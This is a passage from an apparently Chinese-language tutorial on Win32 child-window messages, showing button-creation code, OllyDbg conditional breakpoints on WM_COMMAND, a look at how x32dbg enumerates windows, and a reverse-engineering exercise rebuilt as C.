Window&quot;);wndClass.lpszClassName = className; // 窗口类名wndClass.hInstance = hInstance; // 窗口实例句柄，窗口属于哪个进程，当前进程就是WinMain函数参数hInstancewndClass.lpfnWndProc = WindowProc; // 窗口过程函数// 2. 创建并显示窗口RegisterClass(&amp;wndClass); // 注册窗口类HWND hWnd = CreateWindow(className, // 窗口类名 TEXT(&quot;窗口&quot;), // 窗口标题 WS_OVERLAPPEDWINDOW, // 窗口样式 10, 10, // 窗口位置 相对于父窗口的x坐标和y坐标是什么 600, 300, // 窗口大小 NULL, NULL, // 父窗口句柄和菜单句柄 这个窗口没有父窗口，写空；不需要菜单，写空 hInstance, // 实例句柄 NULL); // 附加参数 没，填空//...//检查CreateWindow是否执行成功的代码略//...ShowWindow(hWnd, SW_SHOW); // 显示窗口 用GetClassName获取一个窗口的类名，通过类名调用GetClassInfo函数得到WNDCLASS结构体，然后就可以查看WNDCLASS结构体里的字段了 将这段代码放到CreateButton函数中创建hwndPushButton窗口后面1234567TCHAR szBuffer[0x20];GetClassName(hwndPushButton, szBuffer, 0x20);WNDCLASS wc;GetClassInfo(g_hInstance, szBuffer, &amp;wc);OutputDebugStringF(&quot;--&gt;%s &quot;, wc.lpszClassName);OutputDebugStringF(&quot;--&gt;%x &quot;, wc.lpfnWndProc); CreateButton完整代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546void CreateButton(HWND hwnd)&#123; HWND hwndPushButton = CreateWindow( TEXT(&quot;button&quot;), TEXT(&quot;普通按钮&quot;), //WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_DEFPUSHBUTTON, WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_DEFPUSHBUTTON, 10, 10, 80, 20, hwnd, (HMENU)1001, //子窗口ID g_hInstance, NULL); TCHAR szBuffer[0x20]; GetClassName(hwndPushButton, szBuffer, 0x20); WNDCLASS wc; GetClassInfo(g_hInstance, szBuffer, &amp;wc); OutputDebugStringF(&quot;--&gt;%s &quot;, wc.lpszClassName); OutputDebugStringF(&quot;--&gt;%x &quot;, wc.lpfnWndProc); HWND hwndCheckBox = CreateWindow( TEXT(&quot;button&quot;), TEXT(&quot;复选框&quot;), //WS_CHILD | WS_VISIBLE | BS_CHECKBOX | BS_AUTOCHECKBOX, WS_CHILD | WS_VISIBLE | BS_CHECKBOX | BS_AUTOCHECKBOX, 10, 40, 80, 20, hwnd, (HMENU)1002, //子窗口ID g_hInstance, NULL); HWND hwndRadio = CreateWindow( TEXT(&quot;button&quot;), TEXT(&quot;单选按钮&quot;), //WS_CHILD | WS_VISIBLE | BS_RADIOBUTTON | BS_AUTORADIOBUTTON, WS_CHILD | WS_VISIBLE | BS_RADIOBUTTON, 10, 70, 80, 20, hwnd, (HMENU)1003, //子窗口ID g_hInstance, NULL);&#125; 发现类名就是Button，而回调函数地址为77b57f60，这个函数在内核中。 实际上，当开发者使用子窗口类来创建窗口，windows觉得开发者没必要为子窗口再写个回调函数，所以系统提供了回调函数。 如果我们在父窗口的回调函数中用case WM_LBUTTONDOWN:来处理鼠标左键的消息，在子窗口上点击鼠标左键是不会执行DbgPrintf那句的，也就是没有触发WM_LBUTTONDOWN消息；在父窗口其他区域点鼠标左键，会触发WM_LBUTTONDOWN消息，DbgPrintf会执行输出。 123456789switch (uMsg)&#123; // 鼠标左键按下时触发的消息 case WM_LBUTTONDOWN: &#123; DbgPrintf(&quot;WM_LBUTTONDOWN %d %d &quot;, wParam, lParam); return 0; &#125;&#125; 原因是这样的，当用户点击按钮后，触发了一个消息，这个消息由系统的回调函数处理，处理后转换为WM_COMMAND消息传给父窗口的回调函数进行处理。 用户在子窗口上鼠标左键的消息已经不再是原来的LBUTTON消息，而被转换成了WM_COMMAND消息。所以如果想处理子窗口上鼠标左键的消息，要用WM_COMMAND，并且此时wParam的低字节表示的是子窗口ID。 12345678910111213141516case WM_COMMAND: &#123; switch(LOWORD(wParam)) &#123; case 1001: MessageBox(hwnd,&quot;Hello Button 1&quot;,&quot;Demo&quot;,MB_OK); return 0; case 1002: MessageBox(hwnd,&quot;Hello Button 2&quot;,&quot;Demo&quot;,MB_OK); return 0; case 1003: MessageBox(hwnd,&quot;Hello Button 3&quot;,&quot;Demo&quot;,MB_OK); return 0; &#125; return DefWindowProc(hwnd,uMsg,wParam,lParam); &#125; 子窗口消息事件处理逻辑定位 这一小节用的exe的源码vc++下Release编译出的exevc123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170#include &lt;stdio.h&gt;#include &lt;stdarg.h&gt;#include &lt;Windows.h&gt;void __cdecl OutputDebugStringF(const char* format, ...);#ifdef _DEBUG #define DbgPrintf OutputDebugStringF #else #define DbgPrintf#endif LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);void CreateButton(HWND hwnd);HINSTANCE g_hInstance;int APIENTRY WinMain(HINSTANCE hInstance, // 当前程序实例的句柄 HINSTANCE hPrevInstance, // 前一个实例的句柄，不再使用 LPSTR lpCmdLine, // 命令行参数 int nCmdShow) // 控制窗口显示方式的标志&#123; g_hInstance = hInstance; // 1. 定义要创建的窗口是什么样的 WNDCLASS wndClass = &#123; 0 &#125;; // 创建WNDCLASS窗口类对象，初始化填充为0 wndClass.hbrBackground = (HBRUSH)COLOR_BACKGROUND; // 窗口背景颜色 TCHAR className[] = TEXT(&quot;My First Window&quot;); wndClass.lpszClassName = className; // 窗口类名 wndClass.hInstance = hInstance; // 窗口实例句柄，窗口属于哪个进程，当前进程就是WinMain函数参数hInstance wndClass.lpfnWndProc = WindowProc; // 窗口过程函数 // 2. 创建并显示窗口 RegisterClass(&amp;wndClass); // 注册窗口类 HWND hWnd = CreateWindow(className, // 窗口类名 TEXT(&quot;窗口&quot;), // 窗口标题 WS_OVERLAPPEDWINDOW, // 窗口样式 10, 10, // 窗口位置 相对于父窗口的x坐标和y坐标是什么 600, 300, // 窗口大小 NULL, NULL, // 父窗口句柄和菜单句柄 这个窗口没有父窗口，写空；不需要菜单，写空 hInstance, // 实例句柄 NULL); // 附加参数 没，填空 char szOutBuff[0x80]; if (hWnd == NULL) &#123; sprintf(szOutBuff, &quot;Error: %d&quot;, GetLastError()); OutputDebugString(szOutBuff); return 0; &#125; CreateButton(hWnd); ShowWindow(hWnd, SW_SHOW); // 显示窗口 // 3. 接收消息并处理 MSG msg; BOOL bRet; while ((bRet = GetMessage(&amp;msg, NULL, 0, 0) ) != 0) // 消息循环 &#123; if (bRet == -1) &#123; sprintf(szOutBuff, &quot;Error: %d&quot;, GetLastError()); OutputDebugString(szOutBuff); return 0; &#125; else &#123; TranslateMessage(&amp;msg); // 翻译消息 DispatchMessage(&amp;msg); // 分发消息 &#125; &#125; return 0;&#125;LRESULT CALLBACK WindowProc(HWND hwnd, // 窗口句柄 UINT uMsg, // 消息标识 WPARAM wParam, // 附加消息信息 LPARAM lParam) // 附加消息信息&#123; switch (uMsg) &#123; //子窗口消息 case WM_COMMAND: &#123; switch (LOWORD(wParam)) &#123; case 1001: MessageBox(hwnd, &quot;Hello Button 1&quot;, &quot;Demo&quot;, MB_OK); return 0; case 1002: MessageBox(hwnd, &quot;Hello Button 2&quot;, &quot;Demo&quot;, MB_OK); return 0; case 1003: MessageBox(hwnd, &quot;Hello Button 3&quot;, &quot;Demo&quot;, MB_OK); return 0; &#125; return DefWindowProc(hwnd, uMsg, wParam, lParam); &#125; &#125; return DefWindowProc(hwnd, uMsg, wParam, lParam); // 默认窗口处理函数&#125;void CreateButton(HWND hwnd)&#123; HWND hwndPushButton = CreateWindow( TEXT(&quot;button&quot;), TEXT(&quot;普通按钮&quot;), //WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_DEFPUSHBUTTON, WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_DEFPUSHBUTTON, 10, 10, 80, 20, hwnd, (HMENU)1001, //子窗口ID g_hInstance, NULL); TCHAR szBuffer[0x20]; GetClassName(hwndPushButton, szBuffer, 0x20); WNDCLASS wc; GetClassInfo(g_hInstance, szBuffer, &amp;wc); OutputDebugStringF(&quot;--&gt;%s &quot;, wc.lpszClassName); OutputDebugStringF(&quot;--&gt;%x &quot;, wc.lpfnWndProc); HWND hwndCheckBox = CreateWindow( TEXT(&quot;button&quot;), TEXT(&quot;复选框&quot;), //WS_CHILD | WS_VISIBLE | BS_CHECKBOX | BS_AUTOCHECKBOX, WS_CHILD | WS_VISIBLE | BS_CHECKBOX | BS_AUTOCHECKBOX, 10, 40, 80, 20, hwnd, (HMENU)1002, //子窗口ID g_hInstance, NULL); HWND hwndRadio = CreateWindow( TEXT(&quot;button&quot;), TEXT(&quot;单选按钮&quot;), //WS_CHILD | WS_VISIBLE | BS_RADIOBUTTON | BS_AUTORADIOBUTTON, WS_CHILD | WS_VISIBLE | BS_RADIOBUTTON, 10, 70, 80, 20, hwnd, (HMENU)1003, //子窗口ID g_hInstance, NULL);&#125;void __cdecl OutputDebugStringF(const char* format, ...)&#123; va_list vlArgs; char* strBuffer = (char*)GlobalAlloc(GPTR, 4096); if (!strBuffer) return; va_start(vlArgs, format); _vsnprintf(strBuffer, 4096 - 1, format, vlArgs); va_end(vlArgs); strcat(strBuffer, &quot; &quot;); OutputDebugStringA(strBuffer); GlobalFree(strBuffer);&#125; 12345LRESULT CALLBACK WindowProc(HWND hwnd, // 窗口句柄 UINT uMsg, // 消息标识 WPARAM wParam, // 附加消息信息 LPARAM lParam // 附加消息信息 ); 通过上面的知识，我们找到一个窗口程序的回调函数后，刚进入回调函数时堆栈是这样的： ESP 返回地址 hwnd uMsg wParam lParam 12ESP + 8 == uMsgESP + C == wParam 在回调函数开头加普通断点后，添加条件[esp+8]==WM_COMMAND，用于断子窗口。但这只能断所有子窗口的消息，如果想精确断下某个子窗口的消息，还要再加条件。断[esp+8]==WM_COMMAND后让程序跑起来，点击“W”按钮，刷新，就可以查看到所有窗口的ID。 击“W”按钮后看不到窗口句柄相关信息解决办法：断在WM_COMMAND后让程序跑起来，点击“W”按钮，没有，点刷新，就出来了断在WM_COMMAND后让程序跑起来，在子窗口点一下，再点W就出来了为什么要刷新？探索过程：OD不开源，没源码。找的x32dbg，x32dbg在“句柄”-“窗口”显示区也有同样的功能，右键也能刷新，从github上下源码（链接是本文写作时的下的，后续版本更新源码可能有变）VSCode全局搜refresh，找右键菜单点击刷新后的代码HandlesView.cpp 执行EnumWindows函数，然后将得到的字段填充在窗口界面上12345678910111213141516171819202122232425262728293031323334353637383940//Enumerate windows and update windows tablevoid HandlesView::enumWindows()&#123; BridgeList&lt;WINDOW_INFO&gt; windows; if(DbgFunctions()-&gt;EnumWindows(&amp;windows)) &#123; auto count = windows.Count(); mWindowsTable-&gt;setRowCount(count); for(auto i = 0; i &lt; count; i++) &#123; mWindowsTable-&gt;setCellContent(i, 0, ToPtrString(windows[i].wndProc)); mWindowsTable-&gt;setCellContent(i, 1, ToHexString(windows[i].handle)); mWindowsTable-&gt;setCellContent(i, 2, QString(windows[i].windowTitle)); mWindowsTable-&gt;setCellContent(i, 3, QString(windows[i].windowClass)); auto tidStr = QString().sprintf(Config()-&gt;getBool(&quot;Gui&quot;, &quot;PidTidInHex&quot;) ? &quot;%X&quot; : &quot;%u&quot;, windows[i].threadId); char threadName[MAX_THREAD_NAME_SIZE]; if(DbgFunctions()-&gt;ThreadGetName(windows[i].threadId, threadName) &amp;&amp; *threadName != &#x27;\\0&#x27;) mWindowsTable-&gt;setCellContent(i, 4, QString::fromUtf8(threadName) + QString(&quot; (%1)&quot;).arg(tidStr)); else mWindowsTable-&gt;setCellContent(i, 4, tidStr); mWindowsTable-&gt;setCellUserdata(i, 4, windows[i].threadId); //Style mWindowsTable-&gt;setCellContent(i, 5, ToHexString(windows[i].style)); //StyleEx mWindowsTable-&gt;setCellContent(i, 6, ToHexString(windows[i].styleEx)); mWindowsTable-&gt;setCellContent(i, 7, ToHexString(windows[i].parent) + (windows[i].parent == ((duint)GetDesktopWindow()) ? tr(&quot; (Desktop window)&quot;) : &quot;&quot;)); //Size QString sizeText = QString(&quot;(%1,%2);%3x%4&quot;).arg(windows[i].position.left).arg(windows[i].position.top) .arg(windows[i].position.right - windows[i].position.left).arg(windows[i].position.bottom - windows[i].position.top); mWindowsTable-&gt;setCellContent(i, 8, sizeText); mWindowsTable-&gt;setCellContent(i, 9, windows[i].enabled != FALSE ? tr(&quot;Enabled&quot;) : tr(&quot;Disabled&quot;)); mWindowsTable-&gt;setRowIcon(i, getWindowIcon((HWND)windows[i].handle)); &#125; &#125; else mWindowsTable-&gt;setRowCount(0); mWindowsTable-&gt;reloadData(); // refresh values also when in mSearchList mWindowsTable-&gt;refreshSearchList();&#125;跟EnumWindows，一层层看，最后是看到Handles.cpp调用EnumWindows API来遍历调试进程的窗口信息，getWindowInfoCallback是回调函数Handles.cpp123456789101112131415161718/**\\brief Enumerates the window and return a list of all the windows owned by the debuggee (currently only top level windows)*/bool HandlesEnumWindows(std::vector&lt;WINDOW_INFO&gt; &amp; windowsList)&#123; std::vector&lt;WINDOW_INFO&gt; childWindowsList; EnumWindows(getWindowInfoCallback, (LPARAM)&amp;windowsList); auto i = windowsList.begin(); for(auto i = windowsList.cbegin(); i != windowsList.cend(); ++i) &#123; EnumChildWindows((HWND)i-&gt;handle, getWindowInfoCallback, (LPARAM)&amp;childWindowsList); &#125; for(auto i = childWindowsList.cbegin(); i != childWindowsList.cend(); ++i) &#123; windowsList.push_back(*i); &#125; return true;&#125;Handles.cpp1234567891011static BOOL CALLBACK getWindowInfoCallback(HWND hWnd, LPARAM lParam)&#123; std::vector&lt;WINDOW_INFO&gt;* windowInfo = reinterpret_cast&lt;std::vector&lt;WINDOW_INFO&gt;*&gt;(lParam); DWORD pid = 0; GetWindowThreadProcessId(hWnd, &amp;pid); if(pid == fdProcessInfo-&gt;dwProcessId) &#123; windowInfo-&gt;push_back(getWindowInfo(hWnd)); &#125; return TRUE;&#125;Handles.cpp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667/**\\brief Get information about a window*/static WINDOW_INFO getWindowInfo(HWND hWnd)&#123; WINDOW_INFO info; memset(&amp;info, 0, sizeof(info)); if(IsWindow(hWnd) != TRUE) //Not a window &#123; return info; &#125; info.handle = (duint)hWnd; //Get Window Handle GetWindowRect(hWnd, &amp;info.position); //Get Window Rect info.style = GetWindowLong(hWnd, GWL_STYLE); //Get Window Style info.styleEx = GetWindowLong(hWnd, GWL_EXSTYLE); //Get Window Stye ex duint proc1, proc2; proc1 = GetClassLongPtrW(hWnd, GCLP_WNDPROC); proc2 = GetClassLongPtrA(hWnd, GCLP_WNDPROC); if(!DbgMemIsValidReadPtr(proc1)) info.wndProc = proc2; else if(!DbgMemIsValidReadPtr(proc2)) info.wndProc = proc1; else if(IsWindowUnicode(hWnd)) info.wndProc = proc1; else info.wndProc = proc2; if(DbgFunctions()-&gt;ModGetParty(info.wndProc) != 0 || !DbgMemIsValidReadPtr(info.wndProc)) &#123; duint dlgproc1, dlgproc2; dlgproc1 = GetClassLongPtrW(hWnd, DWLP_DLGPROC); dlgproc2 = GetClassLongPtrA(hWnd, DWLP_DLGPROC); if(!DbgMemIsValidReadPtr(dlgproc1)) dlgproc1 = dlgproc2; if(DbgMemIsValidReadPtr(dlgproc1)) &#123; info.wndProc = dlgproc1; &#125; &#125; info.enabled = IsWindowEnabled(hWnd) == TRUE; info.parent = (duint)GetParent(hWnd); //Get Parent Window info.threadId = GetWindowThreadProcessId(hWnd, nullptr); //Get Window Thread Id wchar_t limitedbuffer[256]; limitedbuffer[255] = 0; GetWindowTextW(hWnd, limitedbuffer, 256); if(limitedbuffer[255] != 0) //Window title too long. Add &quot;...&quot; to the end of buffer. &#123; if(limitedbuffer[252] &lt; 0xDC00 || limitedbuffer[252] &gt; 0xDFFF) //protect the last surrogate of UTF-16 surrogate pair limitedbuffer[252] = L&#x27;.&#x27;; limitedbuffer[253] = L&#x27;.&#x27;; limitedbuffer[254] = L&#x27;.&#x27;; limitedbuffer[255] = 0; &#125; auto UTF8WindowTitle = StringUtils::Utf16ToUtf8(limitedbuffer); memcpy(info.windowTitle, UTF8WindowTitle.c_str(), min(UTF8WindowTitle.size(), sizeof(info.windowTitle))); //Copy window title with repect to buffer size constraints GetClassNameW(hWnd, limitedbuffer, 256); if(limitedbuffer[255] != 0) //Window class too long. Add &quot;...&quot; to the end of buffer. &#123; if(limitedbuffer[252] &lt; 0xDC00 || limitedbuffer[252] &gt; 0xDFFF) //protect the last surrogate of UTF-16 surrogate pair limitedbuffer[252] = L&#x27;.&#x27;; limitedbuffer[253] = L&#x27;.&#x27;; limitedbuffer[254] = L&#x27;.&#x27;; limitedbuffer[255] = 0; &#125; UTF8WindowTitle = StringUtils::Utf16ToUtf8(limitedbuffer); memcpy(info.windowClass, UTF8WindowTitle.c_str(), min(UTF8WindowTitle.size(), sizeof(info.windowClass))); //Copy window class with repect to buffer size constraints return info;&#125;总结来说，当鼠标右键点击菜单的刷新后。调用API，EnumWindows和EnumChildWindows来遍历调试进程里所有父窗口和子窗口的信息，在回调函数中自己写要遍历哪些信息。另外，x32dbg中没看到子窗口ID。但是OD有，不过能遍历出子窗口，子窗口ID也不难获取了。这里没写验证程序验证下EnumWindows和EnumChildWindows，未来遇到再深入看下。但其实一个程序所有的子窗口ID是写死的，编译后就确定了。之所以要刷新，猜测是：这是动态调试器，会动态显示窗口的信息。并且只有CreateWindow出来的窗口，还没DestroyWindow才会显示在调试器的窗口信息中，可以写程序验证，一开始只有父窗口被创建出来，鼠标左键点击后，创建两个子窗口，鼠标再点一次，两个子窗口被销毁核心代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586LRESULT CALLBACK WindowProc(HWND hwnd, // 窗口句柄 UINT uMsg, // 消息标识 WPARAM wParam, // 附加消息信息 LPARAM lParam) // 附加消息信息&#123; switch (uMsg) &#123; case WM_LBUTTONDOWN: if (!g_buttonsCreated) &#123; DbgPrintf(&quot;Creating buttons...&quot;); CreateButton1(hwnd); CreateButton2(hwnd); g_buttonsCreated = TRUE; &#125; else &#123; DbgPrintf(&quot;Destroying buttons...&quot;); DestroyButtons(); g_buttonsCreated = FALSE; &#125; break; // ... [其余case不变] ... &#125; return DefWindowProc(hwnd, uMsg, wParam, lParam);&#125;void CreateButton1(HWND hwndParent)&#123; g_hwndButton1 = CreateWindow( TEXT(&quot;button&quot;), // 预定义的按钮类 TEXT(&quot;按钮1&quot;), // 按钮上的文字 // WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_DEFPUSHBUTTON, WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_DEFPUSHBUTTON, 210, 130, // 按钮位置（x, y） 180, 40, // 按钮大小（宽度、高度） hwndParent, // 父窗口句柄 (HMENU)1001, // 子窗口ID g_hInstance, // 应用程序实例句柄 NULL); // 无额外窗口数据 if (g_hwndButton1 == NULL) &#123; DbgPrintf(&quot;创建按钮失败，错误代码: %d&quot;, GetLastError()); &#125;&#125;void CreateButton2(HWND hwndParent)&#123; g_hwndButton2 = CreateWindow( TEXT(&quot;button&quot;), // 预定义的按钮类 TEXT(&quot;按钮2&quot;), // 按钮上的文字 // WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_DEFPUSHBUTTON, WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_DEFPUSHBUTTON, 210, 180, // 按钮位置（x, y） 180, 40, // 按钮大小（宽度、高度） hwndParent, // 父窗口句柄 (HMENU)1002, // 子窗口ID g_hInstance, // 应用程序实例句柄 NULL); // 无额外窗口数据 if (g_hwndButton2 == NULL) &#123; DbgPrintf(&quot;创建按钮失败，错误代码: %d&quot;, GetLastError()); &#125;&#125;void DestroyButtons()&#123; if (g_hwndButton1 != NULL) &#123; DestroyWindow(g_hwndButton1); g_hwndButton1 = NULL; DbgPrintf(&quot;Button1 destroyed.&quot;); &#125; if (g_hwndButton2 != NULL) &#123; DestroyWindow(g_hwndButton2); g_hwndButton2 = NULL; DbgPrintf(&quot;Button2 destroyed.&quot;); &#125; InvalidateRect(g_hwndParent, NULL, TRUE); // 重绘父窗口区域 UpdateWindow(g_hwndParent); // 立即更新窗口&#125;完整代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#ifdef _DEBUG #define DbgPrintf OutputDebugStringF #else #define DbgPrintf#endif LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);void CreateButton1(HWND hwnd);void CreateButton2(HWND hwnd);void DestroyButtons();void __cdecl OutputDebugStringF(const char* format, ...);HINSTANCE g_hInstance;HWND g_hwndParent = NULL;HWND g_hwndButton1 = NULL;HWND g_hwndButton2 = NULL;BOOL g_buttonsCreated = FALSE;int APIENTRY WinMain(HINSTANCE hInstance, // 当前程序实例的句柄 HINSTANCE hPrevInstance, // 前一个实例的句柄，不再使用 LPSTR lpCmdLine, // 命令行参数 int nCmdShow) // 控制窗口显示方式的标志&#123; g_hInstance = hInstance; // 1. 定义要创建的窗口是什么样的 WNDCLASS wndClass = &#123;0&#125;; // 创建WNDCLASS窗口类对象，初始化填充为0 wndClass.hbrBackground = (HBRUSH)COLOR_BACKGROUND; // 窗口背景颜色 TCHAR className[] = TEXT(&quot;My First Window&quot;); wndClass.lpszClassName = className; // 窗口类名 wndClass.hInstance = hInstance; // 窗口实例句柄，窗口属于哪个进程，当前进程就是WinMain函数参数hInstance wndClass.lpfnWndProc = WindowProc; // 窗口过程函数 // 2. 创建并显示窗口 RegisterClass(&amp;wndClass); // 注册窗口类 HWND hWnd = CreateWindow(className, // 窗口类名 TEXT(&quot;窗口&quot;), // 窗口标题 WS_OVERLAPPEDWINDOW, // 窗口样式 10, 10, // 窗口位置 相对于父窗口的x坐标和y坐标是什么 600, 300, // 窗口大小 NULL, NULL, // 父窗口句柄和菜单句柄 这个窗口没有父窗口，写空；不需要菜单，写空 hInstance, // 实例句柄 NULL); // 附加参数 没，填空 char szOutBuff[0x80]; if (hWnd == NULL) &#123; sprintf(szOutBuff, &quot;Error: %d&quot;, GetLastError()); OutputDebugString(szOutBuff); return 0; &#125; g_hwndParent = hWnd; ShowWindow(hWnd, SW_SHOW); // 显示窗口 UpdateWindow(hWnd); // 3. 接收消息并处理 MSG msg; BOOL bRet; while ((bRet = GetMessage(&amp;msg, NULL, 0, 0)) != 0) // 消息循环 &#123; if (bRet == -1) &#123; sprintf(szOutBuff, &quot;Error: %d&quot;, GetLastError()); OutputDebugString(szOutBuff); return 0; &#125; else &#123; TranslateMessage(&amp;msg); // 翻译消息 DispatchMessage(&amp;msg); // 分发消息 &#125; &#125; return 0;&#125;LRESULT CALLBACK WindowProc(HWND hwnd, // 窗口句柄 UINT uMsg, // 消息标识 WPARAM wParam, // 附加消息信息 LPARAM lParam) // 附加消息信息&#123; switch (uMsg) &#123; case WM_LBUTTONDOWN: if (!g_buttonsCreated) &#123; DbgPrintf(&quot;Creating buttons...&quot;); CreateButton1(hwnd); CreateButton2(hwnd); g_buttonsCreated = TRUE; &#125; else &#123; DbgPrintf(&quot;Destroying buttons...&quot;); DestroyButtons(); g_buttonsCreated = FALSE; &#125; break; // ... [其余case不变] ... &#125; return DefWindowProc(hwnd, uMsg, wParam, lParam);&#125;void CreateButton1(HWND hwndParent)&#123; g_hwndButton1 = CreateWindow( TEXT(&quot;button&quot;), // 预定义的按钮类 TEXT(&quot;按钮1&quot;), // 按钮上的文字 // WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_DEFPUSHBUTTON, WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_DEFPUSHBUTTON, 210, 130, // 按钮位置（x, y） 180, 40, // 按钮大小（宽度、高度） hwndParent, // 父窗口句柄 (HMENU)1001, // 子窗口ID g_hInstance, // 应用程序实例句柄 NULL); // 无额外窗口数据 if (g_hwndButton1 == NULL) &#123; DbgPrintf(&quot;创建按钮失败，错误代码: %d&quot;, GetLastError()); &#125;&#125;void CreateButton2(HWND hwndParent)&#123; g_hwndButton2 = CreateWindow( TEXT(&quot;button&quot;), // 预定义的按钮类 TEXT(&quot;按钮2&quot;), // 按钮上的文字 // WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_DEFPUSHBUTTON, WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_DEFPUSHBUTTON, 210, 180, // 按钮位置（x, y） 180, 40, // 按钮大小（宽度、高度） hwndParent, // 父窗口句柄 (HMENU)1002, // 子窗口ID g_hInstance, // 应用程序实例句柄 NULL); // 无额外窗口数据 if (g_hwndButton2 == NULL) &#123; DbgPrintf(&quot;创建按钮失败，错误代码: %d&quot;, GetLastError()); &#125;&#125;void DestroyButtons()&#123; if (g_hwndButton1 != NULL) &#123; DestroyWindow(g_hwndButton1); g_hwndButton1 = NULL; DbgPrintf(&quot;Button1 destroyed.&quot;); &#125; if (g_hwndButton2 != NULL) &#123; DestroyWindow(g_hwndButton2); g_hwndButton2 = NULL; DbgPrintf(&quot;Button2 destroyed.&quot;); &#125; InvalidateRect(g_hwndParent, NULL, TRUE); // 重绘父窗口区域 UpdateWindow(g_hwndParent); // 立即更新窗口&#125;void __cdecl OutputDebugStringF(const char* format, ...)&#123; va_list vlArgs; char* strBuffer = (char*)GlobalAlloc(GPTR, 4096); if (!strBuffer) return; va_start(vlArgs, format); _vsnprintf(strBuffer, 4096 - 1, format, vlArgs); va_end(vlArgs); strcat(strBuffer, &quot; &quot;); OutputDebugStringA(strBuffer); GlobalFree(strBuffer);&#125;VC++，Release编译，拖到OD执行CreateWindow创建父窗口前“W”界面看不到信息，执行后看到父窗口的信息对回调函数下断，添加条件[esp+8]==WM_LBUTTONDOWN，F9程序跑起来在父窗口上点鼠标左键（创建两个按钮），OD断下，F9跑起来F9放过的原因，OD断下断下鼠标左键后，如果单步，会走DefWindowProcA（因为鼠标左键点击还产生了其他的消息），属于干扰信息了直接F9跑过去。硬要分析的话，完整的流程是：鼠标左键点击，OD断下CreateButton1-&gt;DefWindowProcA-&gt;CreateButton2-&gt;DefWindowProcA跟到0环DefWindowProcA后没跟了，F9放过，然后“W”界面才会有变化所以下图标红（标红表示新出现）的是按钮2，而按钮1没标红观察CreateButton后“W”界面信息变化，发现多了子窗口的句柄信息再次在在父窗口上点鼠标左键在父窗口上点鼠标左键（销毁两个按钮），OD断下，F9跑起来观察CreateButton后“W”界面信息变化，发现子窗口的句柄信息没了 假如想断单选按钮子窗口，再添加条件[esp+0xC]==0x3EB，完整的条件是： 1[esp+8]==WM_COMMAND&amp;&amp;[esp+0xC]==0x3EB 那么当单选按钮子窗口的消息被触发，OD就会断下。 练习 点击窗口上三个按钮会弹窗，弹窗前程序分别做了什么事（ReverseTraining_2.exe） 做题过程断下WM_COMMAND后，跑起来，点击“W”按钮看窗口的信息随便选个子窗口添加条件断点Find Me 1按钮1[esp+8]==WM_COMMAND&amp;&amp;[esp+0xC]==0x3E9Find Me 2按钮1[esp+8]==WM_COMMAND&amp;&amp;[esp+0xC]==0x3EAFind Me 3按钮1[esp+8]==WM_COMMAND&amp;&amp;[esp+0xC]==0x3EB点击相应子窗口，让OD断下，开始分析[esp+8]是uMsg，[esp+0xC]是wParam（窗口ID），查头文件发现WM_DESTROY对应2ds:[408514]是个全局变量，因为它使用ds:[]的方式寻址，而不是esp或ebp寻址btw：当时想0x3E9，0x3EA，0x3EB三个case构成连续的条件，竟然没有优化。查了下笔记，分支数≤3采用模拟if…else。好吧╮(╯-╰)╭还原为C语言1234567891011121314151617181920212223242526272829303132333435363738394041424344LRESULT CALLBACK WindowProc(HWND hwnd, // 窗口句柄 UINT uMsg, // 消息标识 WPARAM wParam, // 附加消息信息 LPARAM lParam) // 附加消息信息&#123; switch (uMsg) &#123; case(WM_COMMAND): &#123; switch (wParam) &#123; case 0x3E9: &#123; MessageBox(NULL, &quot;Find Me 1&quot;, &quot;Demo&quot;, MB_OK | MB_APPLMODAL); *(DWORD*)0x408514 = 1; //修改全局变量的值 return 0; &#125; case 0x3EA: &#123; MessageBox(NULL, &quot;Find Me 2&quot;, &quot;Demo&quot;, MB_OK | MB_APPLMODAL); *(DWORD*)0x408514 = 2; //修改全局变量的值 return 0; &#125; case 0x3EB: &#123; MessageBox(NULL, &quot;Find Me 3&quot;, &quot;Demo&quot;, MB_OK | MB_APPLMODAL); *(DWORD*)0x408514 = 3; //修改全局变量的值 return 0; &#125; default: &#123; return DefWindowProc(hwnd, uMsg, wParam, lParam); &#125; &#125; &#125; case(WM_DESTROY): &#123; PostQuitMessage(0); return 0; &#125; &#125; //return DefWindowProc(hwnd, uMsg, wParam, lParam); //应该还需要有这句（根据窗口程序编写经验推导的，将不需要的消息交给DefWindowProc处理），OD里看没看出这句&#125;写完整程序的验证还原的C语言，VC++Release编译然后拖入OD看。逻辑上还原地一样这次switch把条件做一起判断了验证程序的完整代码三个创建按钮的参数从exe里扒的123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155#include &lt;Windows.h&gt;#include 